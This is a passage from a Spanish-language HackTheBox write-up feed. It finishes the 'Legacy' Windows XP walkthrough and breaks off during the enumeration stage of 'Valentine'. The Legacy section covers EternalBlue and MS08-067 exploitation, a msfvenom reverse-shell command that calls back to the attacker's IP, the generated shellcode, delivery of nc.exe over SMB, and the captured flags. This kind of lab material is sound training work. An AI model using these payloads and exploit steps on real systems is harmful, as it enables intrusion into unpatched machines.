64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=119 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.571/118.571/118.571/0.000 ms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:54 GMT
Initiating SYN Stealth Scan at 18:54
Scanning 10.10.10.4 [65535 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 135/tcp on 10.10.10.4
Completed SYN Stealth Scan at 18:55, 21.64s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.18s latency).
Scanned at 2023-06-29 18:54:52 GMT for 21s
Not shown: 56233 closed tcp ports (reset), 9299 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
           Raw packets sent: 106649 (4.693MB) | Rcvd: 65813 (2.633MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445 10.10.10.4 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:56 GMT
Nmap scan report for 10.10.10.4
Host is up (0.18s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:a9:4a (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-07-04T23:53:50+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows XP&lt;/code&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;Windows XP microsoft-ds&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vemos que la maquina corresponde &lt;code&gt;Windows XP&lt;/code&gt;, podemos explotar el &lt;code&gt;eternal blue&lt;/code&gt;, asi que vamos a explotarlo usando el exploit de github de warawit.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;https://github.com/worawit/MS17-010&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Descargamos al repositorio y ejecutamos el &lt;code&gt;checker.py&lt;/code&gt;, para encontrar &lt;code&gt;named pipes&lt;/code&gt; vulnerables.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ejectamos el &lt;code&gt;checker.py&lt;/code&gt; el cual nos reporta dos &lt;code&gt;named pipes&lt;/code&gt; de los que podemos abusar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos abriremos el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, para modificar la instrucción que queremos ejecutar al lanzar el exploit, en la que nos montaremos un recurso compartido en nuestra maquina donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt; el cual se ejecutara otorgandonos una conexión a nuestra maquina. Esto descomentado la opción &lt;code&gt;service_exec&lt;/code&gt; y comentaremos las lineas previas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para ello, podemos descarganos el ejecutable de &lt;code&gt;nc&lt;/code&gt;, para ello iremos al siguiente enlace y descargaremos el correspondiente a la versión &lt;code&gt;1.12&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si optamos por descargarlo de esta manera obtendremos un comprimido, el cual debemos descomprimirlo en una carpeta aparte ya que este contiene muchos archivos.&lt;/p&gt;

&lt;p&gt;En mi caso yo usare el &lt;code&gt;nc.exe&lt;/code&gt; que contempla el repositorio de &lt;code&gt;danil miesler&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cp /opt/SecLists/Miscellaneous/web/http-request-headers/nc.exe .
❯ ls
 MS17-010   nc.exe   netcat-win32-1.12.zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a montar nuestro recurso compartido, donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; por el puerto que configuramos, en este caso el correspondiente a el &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;zzz_exploit.py&lt;/code&gt; junto con el named pipe que previamente nos reporto el &lt;code&gt;checker.py&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py 10.10.10.4 spoolss
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86101b30
SESSION: 0xe1b1cc68
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la conexión.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1046.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos ir al directorio del usuario john y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Documents and Settings\john\Desktop&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19     &amp;lt;DIR&amp;gt;          .
16/03/2017  09:19     &amp;lt;DIR&amp;gt;          ..
16/03/2017  09:19                 32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.342.070.272 bytes free

C:\Documents and Settings\john\Desktop&amp;gt;type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotacion-alterna&quot;&gt;EXPLOTACION ALTERNA &lt;a href=&quot;#explotacion-alterna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora para comprometer la maquina de una manera alternativa, primero usaremos los scripts &lt;code&gt;smb-vuln\*&lt;/code&gt; de nmap en el puerto &lt;code&gt;445&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;QUITTING!
❯ nmap --script smb-vuln\* -p445 10.10.10.4 -oN smbScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 19:55 GMT
Nmap scan report for 10.10.10.4
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nmap nos reporta que el servicio es vulnerable a &lt;code&gt;ms08-067&lt;/code&gt; ya que corresponde a un &lt;code&gt;Windows XP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para poder explotarla vamos a descargarnos un exploit de &lt;code&gt;andyacer&lt;/code&gt; de github:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/andyacer/ms08_067&quot;&gt;https://github.com/andyacer/ms08_067&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahi nos explican a fondo en que consiste la explotación y nos pide que generemos un &lt;code&gt;shellcode&lt;/code&gt; el cual debemos ingresar al &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello vamos a generar el shellcode usando &lt;code&gt;msfvenom&lt;/code&gt;, si no sabes como en el repositorio te explica como debemos hacerlo exactamente, solo debemos especificar nuestra ip y el puerto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76&quot;
&quot;\x0e\x63\xc8\xc3\x99\x83\xee\xfc\xe2\xf4\x9f\x20\x41\x99&quot;
&quot;\x63\xc8\xa3\x10\x86\xf9\x03\xfd\xe8\x98\xf3\x12\x31\xc4&quot;
&quot;\x48\xcb\x77\x43\xb1\xb1\x6c\x7f\x89\xbf\x52\x37\x6f\xa5&quot;
&quot;\x02\xb4\xc1\xb5\x43\x09\x0c\x94\x62\x0f\x21\x6b\x31\x9f&quot;
&quot;\x48\xcb\x73\x43\x89\xa5\xe8\x84\xd2\xe1\x80\x80\xc2\x48&quot;
&quot;\x32\x43\x9a\xb9\x62\x1b\x48\xd0\x7b\x2b\xf9\xd0\xe8\xfc&quot;
&quot;\x48\x98\xb5\xf9\x3c\x35\xa2\x07\xce\x98\xa4\xf0\x23\xec&quot;
&quot;\x95\xcb\xbe\x61\x58\xb5\xe7\xec\x87\x90\x48\xc1\x47\xc9&quot;
&quot;\x10\xff\xe8\xc4\x88\x12\x3b\xd4\xc2\x4a\xe8\xcc\x48\x98&quot;
&quot;\xb3\x41\x87\xbd\x47\x93\x98\xf8\x3a\x92\x92\x66\x83\x97&quot;
&quot;\x9c\xc3\xe8\xda\x28\x14\x3e\xa0\xf0\xab\x63\xc8\xab\xee&quot;
&quot;\x10\xfa\x9c\xcd\x0b\x84\xb4\xbf\x64\x37\x16\x21\xf3\xc9&quot;
&quot;\xc3\x99\x4a\x0c\x97\xc9\x0b\xe1\x43\xf2\x63\x37\x16\xc9&quot;
&quot;\x33\x98\x93\xd9\x33\x88\x93\xf1\x89\xc7\x1c\x79\x9c\x1d&quot;
&quot;\x54\xf3\x66\xa0\xc9\x93\x73\xcb\xab\x9b\x63\xc9\x78\x10&quot;
&quot;\x85\xa2\xd3\xcf\x34\xa0\x5a\x3c\x17\xa9\x3c\x4c\xe6\x08&quot;
&quot;\xb7\x95\x9c\x86\xcb\xec\x8f\xa0\x33\x2c\xc1\x9e\x3c\x4c&quot;
&quot;\x0b\xab\xae\xfd\x63\x41\x20\xce\x34\x9f\xf2\x6f\x09\xda&quot;
&quot;\x9a\xcf\x81\x35\xa5\x5e\x27\xec\xff\x98\x62\x45\x87\xbd&quot;
&quot;\x73\x0e\xc3\xdd\x37\x98\x95\xcf\x35\x8e\x95\xd7\x35\x9e&quot;
&quot;\x90\xcf\x0b\xb1\x0f\xa6\xe5\x37\x16\x10\x83\x86\x95\xdf&quot;
&quot;\x9c\xf8\xab\x91\xe4\xd5\xa3\x66\xb6\x73\x23\x84\x49\xc2&quot;
&quot;\xab\x3f\xf6\x75\x5e\x66\xb6\xf4\xc5\xe5\x69\x48\x38\x79&quot;
&quot;\x16\xcd\x78\xde\x70\xba\xac\xf3\x63\x9b\x3c\x4c&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ese shellcode generado, ahora vamos a introducirlo en el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos el exploit sin antes ponernos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la conexión, ahora podemos ir al directorio del usuario &lt;code&gt;Administrator&lt;/code&gt; y leer la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1047.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&amp;gt; cd &quot;Documents and Settings&quot;
cd &quot;Documents and Settings&quot;

C:\Documents and Settings&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07     &amp;lt;DIR&amp;gt;          .
16/03/2017  09:07     &amp;lt;DIR&amp;gt;          ..
16/03/2017  09:07     &amp;lt;DIR&amp;gt;          Administrator
16/03/2017  08:29     &amp;lt;DIR&amp;gt;          All Users
16/03/2017  08:33     &amp;lt;DIR&amp;gt;          john
               0 File(s)              0 bytes
               5 Dir(s)   6.403.846.144 bytes free

C:\Documents and Settings&amp;gt;cd Administrator\Desktop
cd Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop&amp;gt;type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 29 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Legacy</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Legacy</guid>
        
        <category>SMB Enumeration</category>
        
        <category>Eternal Blue explotation</category>
        
        <category>(MS17-010)</category>
        
        <category>(MS08-067)</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Valentine - htb writeup</title>
        <description>&lt;p&gt;Hola, el dia de hoy vamos a resolver la máquina &lt;code&gt;Valentine&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, la cual explotaremos abusando de una vulnerabilidad en el servicio &lt;code&gt;ssl&lt;/code&gt; mediante la cual podremos leer registros de la memoria del servidor, obteniendo una credencial que nos permitira acceder al sistema usando una clave publica y finalmente haremos de dos formas la elevación de privilegios, una en la cual abusaremos de una &lt;code&gt;socket file&lt;/code&gt; de tmux y otra donde explotaremos el kernel vulnerable a el &lt;code&gt;dirty cow&lt;/code&gt; y convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Asi que a darle con todo!&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Valentine
❯ ls
 Valentine
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.79
PING 10.10.10.79 (10.10.10.79) 56(84) bytes of data.
64 bytes from 10.10.10.79: icmp_seq=1 ttl=63 time=382 ms

--- 10.10.10.79 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 382.225/382.225/382.225/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.79 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 23:06 GMT
Initiating SYN Stealth Scan at 23:06
Scanning 10.10.10.79 [65535 ports]
Discovered open port 80/tcp on 10.10.10.79
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 22/tcp on 10.10.10.79
Completed SYN Stealth Scan at 23:06, 18.00s elapsed (65535 total ports)
Nmap scan report for 10.10.10.79
Host is up, received user-set (0.12s latency).
Scanned at 2023-06-24 23:06:26 GMT for 18s
Not shown: 65479 closed tcp ports (reset), 53 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.16 seconds
           Raw packets sent: 88724 (3.904MB) | Rcvd: 86353 (3.454MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,443 10.10.10.79 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 23:07 GMT
Nmap scan report for 10.10.10.79
Host is up (0.37s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2023-06-24T23:07:52+00:00; -2s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
